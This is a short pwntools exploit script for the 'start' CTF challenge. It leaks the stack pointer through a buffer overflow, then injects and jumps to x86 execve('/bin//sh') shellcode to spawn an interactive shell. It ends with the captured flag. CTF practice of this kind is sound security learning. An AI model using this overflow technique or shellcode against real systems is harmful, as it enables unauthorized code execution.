from pwn import *
# context.log_level = "debug"
p = process('./start')

payload = 'A'*0x14 + p32(0x8048087)
#leak esp after +0x14)
# gdb.attach(p,"b *08048087")
p.sendafter("Let's start the CTF:",payload)
esp = u32(p.recv(4))
print 'esp: '+hex(esp)
shellcode='\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
#shellcode = asm('xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov al,0xb;int 0x80')
# print shellcode
payload = 'A'*0x14 + p32(esp+0x14) + shellcode #Jump to shellcode
p.sendline(payload)
p.interactive()

#FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
#pwned by Ld1ng
